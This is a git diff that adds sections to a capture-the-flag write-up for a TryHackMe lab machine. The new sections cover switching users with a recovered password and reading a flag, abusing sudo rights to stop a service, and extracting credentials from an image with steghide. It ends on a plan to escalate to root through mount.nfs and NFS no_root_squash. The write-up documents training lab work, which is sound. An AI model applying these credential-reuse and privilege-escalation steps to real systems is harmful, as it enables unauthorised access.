@@ -346,3 +346,72 @@ listening on 0.0.0.0:3000
 
 ![image](https://github.com/Velatryx/CTF-Writeups/blob/main/AcademyLabs/TryHackMe/Hard/DX2%3A%20Hell's%20Kitchen/Images/Screenshot%20From%202026-08-05%2011-04-57.png)
 
+---
+
+## Lateral Movement - Sandra (second flag: user.txt)
+
+> Okay, let's try `anywherebuthere` as password to authenticate as Sandra.
+
+```bash
+gilbert@tonhotel:/srv$ su - sandra
+Password: 
+$ id
+uid=1002(sandra) gid=1002(sandra) groups=1002(sandra)
+$ ls
+note.txt  Pictures  user.txt
+$ cat note.txt
+Tasks
+-give boss access to home server, in exchange for a few nights break (DONE)
+-get bags and stash ready
+-talk to smuggler, see if he can get me a job out of the city and away from jojo's people
+$ cat user.txt
+thm{5b23d18...d2fa3e}
+$ 
+```
+
+## Lateral movement - Jojo
+
+> Looks like we have sudo rights as root to stop and start the tonhotel service. Well maybe this is just a deadend.
+
+```bash
+$ sudo -l
+[sudo] password for sandra: 
+Matching Defaults entries for sandra on tonhotel:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User sandra may run the following commands on tonhotel:
+    (root) /usr/bin/systemctl stop tonhotel
+    (root) /usr/bin/systemctl start tonhotel
+$ 
+```
+
+> I tried to send a jpg file so that I could extract any hidden info from it if there was, but I could not send it using any port. Then I remembered that tonhotel service was using port 80, meaning I could not use it as it would be busy. But we have root privileges to stop it! And it worked!
+
+![image](https://github.com/Velatryx/CTF-Writeups/blob/main/AcademyLabs/TryHackMe/Hard/DX2%3A%20Hell's%20Kitchen/Images/Screenshot%20From%202026-08-05%2011-38-25.png)
+
+![image](https://github.com/Velatryx/CTF-Writeups/blob/main/AcademyLabs/TryHackMe/Hard/DX2%3A%20Hell's%20Kitchen/Images/Screenshot%20From%202026-08-05%2011-38-59.png)
+
+> Let's analyze it using `steghide` which is used to embed/extract hidden data or files inside an image.
+
+```bash
+steghide info boss.jpg
+"boss.jpg":
+  format: jpeg
+  capacity: 1.4 KB
+Try to get information about embedded data ? (y/n) y
+Enter passphrase: 
+steghide: could not extract any data with that passphrase!
+```
+
+> Hmm... Both password attempts using `anywherebuthere` and `ilovemydaughter` did not work. After a while, I noticed that I did not even know what the image looked like :D So without overthinking about the passpwhrase, I used the credentials for jojo that I saw in the image itself xD.
+
+![image](https://github.com/Velatryx/CTF-Writeups/blob/main/AcademyLabs/TryHackMe/Hard/DX2%3A%20Hell's%20Kitchen/Images/Screenshot%20From%202026-08-05%2011-50-34.png)
+
+---
+
+## Privilege Escalation
+
+> Sudo -l shows we can execute /usr/sbin/mount.nfs as root. If no_root_squashing is enabled, we can transfer a file and execute it as root, escalating our privileges, using Network File System (NFS).
+
+![image](https://github.com/Velatryx/CTF-Writeups/blob/main/AcademyLabs/TryHackMe/Hard/DX2%3A%20Hell's%20Kitchen/Images/Screenshot%20From%202026-08-05%2011-51-40.png)
+
